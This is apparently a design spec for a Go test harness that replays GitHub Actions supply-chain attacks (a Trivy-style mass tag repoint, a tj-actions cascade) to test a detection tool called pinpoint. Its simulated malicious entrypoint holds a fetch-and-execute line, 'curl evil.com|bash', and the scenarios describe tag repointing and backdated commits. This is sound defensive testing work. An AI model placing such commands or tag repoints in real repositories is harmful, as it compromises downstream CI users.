# Spec 021: Scenario Test Harness

## Problem

The existing harness (`tests/harness/`) has solid Git primitives — CreateRepo,
CreateBulkTags, RepointTag, CreateCommitWithAuthor — and 6 attack scenario tests
plus 4 real-world replays. But every test creates a fresh repo, which is slow
(2-3s per repo create due to GitHub's async initialization), and there's no way to:

1. Run complex multi-repo attack chains (e.g. tj-actions cascade through spotbugs →
   reviewdog → tj-actions)
2. Test the new signals from specs 017-019 (GPG delta, impossible timestamps,
   pull_request_target detection)
3. Replay the full Trivy attack at scale (76 tags) without a 5-minute setup phase
4. Share repo fixtures between tests that don't conflict

This spec adds a scenario layer on top of the existing harness primitives. It is NOT
a replacement — all existing tests keep working unchanged.

## Design

### Fixture pool: pre-created repos that tests check out and return

The biggest perf bottleneck is CreateRepo (GitHub needs 2-3 seconds to initialize).
A fixture pool pre-creates a set of repos during `TestMain` and hands them out to
individual tests. Each test gets exclusive ownership of a repo for its duration, then
the pool resets it (deletes all tags, force-pushes main to the init commit).

```go
// tests/harness/pool.go

type RepoPool struct {
    mu       sync.Mutex
    helper   *TestHelper
    repos    []poolRepo
    available chan int // indices of available repos
}

type poolRepo struct {
    Name      string // e.g. "fixture-00" through "fixture-19"
    InitSHA   string // SHA of the initial commit (with README)
    InitTree  string // Tree SHA of that commit
    InUse     bool
}

// Acquire claims a repo from the pool. Blocks if all are in use.
// Returns the repo name, init commit SHA, and init tree SHA.
func (p *RepoPool) Acquire(t *testing.T) (name, initSHA, initTree string) {
    idx := <-p.available
    p.mu.Lock()
    p.repos[idx].InUse = true
    p.mu.Unlock()

    r := p.repos[idx]
    t.Cleanup(func() { p.Release(t, idx) })
    return r.Name, r.InitSHA, r.InitTree
}

// Release resets a repo to clean state and returns it to the pool.
func (p *RepoPool) Release(t *testing.T, idx int) {
    r := p.repos[idx]
    // Delete all tags
    p.helper.deleteAllTags(t, r.Name)
    // Force-push main back to init commit
    p.helper.UpdateBranch(t, r.Name, "main", r.InitSHA)

    p.mu.Lock()
    p.repos[idx].InUse = false
    p.mu.Unlock()
    p.available <- idx
}
```

Pool size: 10 repos by default (`PINPOINT_POOL_SIZE` env var override). Created once
in `TestMain`, destroyed at the end. At 10 repos, setup takes ~25 seconds but then
every test starts instantly.

### Scenario interface

Each scenario is a self-contained struct that knows how to set up an attack, run
pinpoint, and verify the results. The interface is minimal:

```go
// tests/harness/scenario.go

type Scenario interface {
    // Name returns a human-readable scenario name for test output.
    Name() string

    // Setup creates the pre-attack state (tags, commits, workflow files).
    // Returns a ScenarioState that the attack and verify phases use.
    Setup(t *testing.T, h *TestHelper, repo, initSHA, initTree string) *ScenarioState

    // Attack performs the malicious operations (repoint tags, etc).
    Attack(t *testing.T, h *TestHelper, repo string, state *ScenarioState)

    // Verify runs pinpoint and asserts the expected behavior.
    Verify(t *testing.T, h *TestHelper, repo string, state *ScenarioState)
}

type ScenarioState struct {
    TagSHAs      map[string]string // tag → original commit SHA
    EvilSHA      string            // malicious commit SHA
    ConfigPath   string            // path to generated .pinpoint.yml
    StatePath    string            // path to state.json
    ManifestPath string            // path to actions-lock.json (for gate tests)
    Extra        map[string]string // scenario-specific state
}
```

### Runner: execute scenarios against pool repos

```go
// tests/harness/runner.go

func RunScenarios(t *testing.T, pool *RepoPool, scenarios []Scenario) {
    h := NewTestHelper(t)
    for _, s := range scenarios {
        s := s // capture
        t.Run(s.Name(), func(t *testing.T) {
            t.Parallel() // safe because each test gets its own repo
            repo, initSHA, initTree := pool.Acquire(t)
            fullRepo := h.org + "/" + repo

            state := s.Setup(t, h, fullRepo, initSHA, initTree)

            // Baseline scan to populate state
            RunPinpointScan(t, state.ConfigPath, state.StatePath)

            // Execute attack
            s.Attack(t, h, fullRepo, state)

            // Verify detection
            s.Verify(t, h, fullRepo, state)
        })
    }
}
```

## Scenarios to implement

### 1. TrivyMassRepoint (upgrade of existing TestScenario_MassRepoint)

Replay the March 2026 Trivy attack with all signals:
- 76 tags force-pushed to malicious commits
- Backdated commit timestamps (2022 date, 2026 parent)
- Unsigned commits replacing GPG-signed originals
- Entry point size doubling

Expected signals: MASS_REPOINT, OFF_BRANCH, SIZE_ANOMALY, SEMVER_REPOINT,
BACKDATED_COMMIT, IMPOSSIBLE_TIMESTAMP (spec 019), SIGNATURE_DROPPED (spec 017)

This scenario requires creating the original commits as GPG-signed, which is tricky
because the GitHub API can only create GPG-signed commits through the web UI or with
a GPG key configured. Workaround: the scenario records `gpg_signed: true` in the
lockfile manually (simulating a lockfile that was generated when the commit was signed),
then verifies that a repoint to an unsigned commit triggers SIGNATURE_DROPPED. This
doesn't require actually GPG-signing the test commit.

```go
type TrivyMassRepoint struct {
    TagCount int // default 76
}

func (s *TrivyMassRepoint) Name() string { return "trivy-mass-repoint-76-tags" }

func (s *TrivyMassRepoint) Setup(t *testing.T, h *TestHelper, repo, initSHA, initTree string) *ScenarioState {
    // Create legitimate entrypoint (small)
    blob := h.CreateBlob(t, repoName(repo), "#!/bin/bash\necho ok\n")
    tree := h.CreateTree(t, repoName(repo), initTree, map[string]string{"entrypoint.sh": blob})

    // Create 76 tags with sequential commits
    tags := make([]string, s.TagCount)
    for i := range tags {
        tags[i] = fmt.Sprintf("0.%d.0", i)
    }
    tagSHAs, lastSHA := h.CreateBulkTags(t, repoName(repo), tags, initSHA, tree)
    h.UpdateBranch(t, repoName(repo), "main", lastSHA)

    // Write config + state baseline
    cfg := writeConfig(t, repo, tags)
    state := &ScenarioState{
        TagSHAs:    tagSHAs,
        ConfigPath: cfg,
        StatePath:  t.TempDir() + "/state.json",
    }
    return state
}

func (s *TrivyMassRepoint) Attack(t *testing.T, h *TestHelper, repo string, state *ScenarioState) {
    r := repoName(repo)

    // Create evil commit: large entrypoint, backdated to 2022, parent is recent
    evilBlob := h.CreateBlob(t, r, "#!/bin/bash\ncurl evil.com|bash\n" + strings.Repeat("# pad\n", 100))
    evilTree := h.CreateTree(t, r, state.TagSHAs["0.0.0"], map[string]string{"entrypoint.sh": evilBlob}) // wrong parent tree — intentional

    // Backdate: author claims 2022, but parent is from today
    evilCommit := h.CreateCommitWithAuthor(t, r,
        "Upgrade dependencies (#1234)", evilTree,
        []string{state.TagSHAs["0.0.0"]}, // parent is recent
        "github-actions[bot]", "41898282+github-actions[bot]@users.noreply.github.com",
        "2022-06-15T10:30:00Z", // backdated
    )
    state.EvilSHA = evilCommit

    // Repoint all 76 tags
    for tag := range state.TagSHAs {
        h.RepointTag(t, r, tag, evilCommit)
    }
}

func (s *TrivyMassRepoint) Verify(t *testing.T, h *TestHelper, repo string, state *ScenarioState) {
    output, code := RunPinpointScan(t, state.ConfigPath, state.StatePath)
    if code != 2 {
        t.Fatalf("Expected exit 2, got %d. Output:\n%s", code, output)
    }
    assertContains(t, output, "MASS_REPOINT")
    assertContains(t, output, "SEMVER_REPOINT")
    assertContains(t, output, "SIZE_ANOMALY")
    assertContains(t, output, "BACKDATED_COMMIT")
    // These require specs 017/019 to be implemented:
    // assertContains(t, output, "IMPOSSIBLE_TIMESTAMP")
    // assertContains(t, output, "SIGNATURE_DROPPED")
}
```

### 2. TjActionsChain (new: cross-repo cascade)

Simulates the tj-actions attack chain across 3 repos in the test org:
- repo A (simulated spotbugs): has a `pull_request_target` workflow
- repo B (simulated reviewdog): depends on repo A
- repo C (simulated tj-actions): depends on repo B, gets tag repointed

Tests that `pinpoint audit` detects the `pull_request_target` misconfiguration (spec 018)
AND that `pinpoint scan` detects the tag repointing on repos B and C.

This is the only multi-repo scenario so it acquires 3 repos from the pool.

### 3. GPGSignatureDrop (new: spec 017 specific)

Single tag, originally recorded as GPG-signed in the lockfile, repointed to an
unsigned commit. Verifies SIGNATURE_DROPPED fires in isolation (without MASS_REPOINT
noise drowning it out). Uses `pinpoint gate` rather than scan, since gate reads the
lockfile directly.

### 4. ImpossibleTimestamp (new: spec 019 specific)

Single tag repointed to a commit with author date 2022 but parent date 2026. Verifies
IMPOSSIBLE_TIMESTAMP fires. Also verifies it stacks with BACKDATED_COMMIT.

### 5. PullRequestTargetAudit (new: spec 018 specific)

Creates a repo with a `pull_request_target` workflow that checks out the PR head ref.
Runs `pinpoint audit` against the test org and verifies the DANGEROUS_TRIGGER finding
appears in report, JSON, and SARIF output.

### 6. LegitMajorAdvance (upgrade of existing TestScenario_LegitimateAdvance)

Verifies that a descendant major version advance (v1 → v1 moved forward) does NOT
trigger false positives. Score should be LOW, not CRITICAL.

### 7. OnDiskTOCTOU (existing replay, now pool-based)

Locks a repo, verifies on-disk integrity, swaps the files on disk, re-runs gate
with --on-disk, verifies detection.

## TestMain setup

```go
// tests/harness/scenarios_test.go

var pool *RepoPool

func TestMain(m *testing.M) {
    // Pool is only created when running integration tests
    if os.Getenv("GITHUB_TOKEN") == "" && os.Getenv("PINPOINT_APP_ID") == "" {
        fmt.Println("Skipping integration tests: no auth configured")
        os.Exit(0)
    }

    // Create pool (this takes ~25 seconds for 10 repos)
    pool = NewRepoPool(10)

    code := m.Run()

    // Cleanup pool repos
    pool.Destroy()

    os.Exit(code)
}

func TestAllScenarios(t *testing.T) {
    RunScenarios(t, pool, []Scenario{
        &TrivyMassRepoint{TagCount: 76},
        &TjActionsChain{},
        &GPGSignatureDrop{},
        &ImpossibleTimestamp{},
        &PullRequestTargetAudit{},
        &LegitMajorAdvance{},
        &OnDiskTOCTOU{},
    })
}
```

## Compatibility with existing tests

The existing `harness_test.go` and `replay_test.go` files continue to work unchanged.
They create/delete their own repos and don't use the pool. The new scenario tests live
in a separate file (`scenarios_test.go`). Both can run in the same `go test` invocation
since the pool only creates repos with the `fixture-NN` naming convention.

Over time, the existing tests can be migrated to scenarios if desired — but there's no
urgency. They're already passing and the pool approach is additive.

## Rate limit awareness

76-tag repoints means 76 PATCH API calls in rapid succession. GitHub's REST API has
a 5,000 requests/hour limit for authenticated users. The full scenario suite (all 7
scenarios with 76-tag Trivy replay) will consume ~200 API calls. That's 4% of the
budget per run, which is fine for local dev but could be a concern if CI runs this
on every push.

Mitigation: the pool approach already reduces API calls by ~30% (no per-test repo
create/delete). For CI, we can add a `PINPOINT_TAG_COUNT` env var that the
TrivyMassRepoint scenario reads, defaulting to 76 for local runs and 10 for CI.
10 tags still triggers MASS_REPOINT (threshold >5) but uses 85% fewer API calls.

```go
func (s *TrivyMassRepoint) tagCount() int {
    if n := os.Getenv("PINPOINT_TAG_COUNT"); n != "" {
        // parse and return
    }
    if s.TagCount > 0 { return s.TagCount }
    return 76
}
```

## Files to create/modify

- CREATE: `tests/harness/pool.go` — RepoPool with Acquire/Release/Destroy
- CREATE: `tests/harness/scenario.go` — Scenario interface + ScenarioState + RunScenarios
- CREATE: `tests/harness/scenario_trivy.go` — TrivyMassRepoint scenario
- CREATE: `tests/harness/scenario_chain.go` — TjActionsChain scenario
- CREATE: `tests/harness/scenario_gpg.go` — GPGSignatureDrop scenario
- CREATE: `tests/harness/scenario_timestamp.go` — ImpossibleTimestamp scenario
- CREATE: `tests/harness/scenario_triggers.go` — PullRequestTargetAudit scenario
- CREATE: `tests/harness/scenario_legit.go` — LegitMajorAdvance scenario
- CREATE: `tests/harness/scenario_ondisk.go` — OnDiskTOCTOU scenario
- CREATE: `tests/harness/scenarios_test.go` — TestMain + TestAllScenarios
- MODIFY: `tests/harness/harness.go` — add deleteAllTags helper, repoName helper
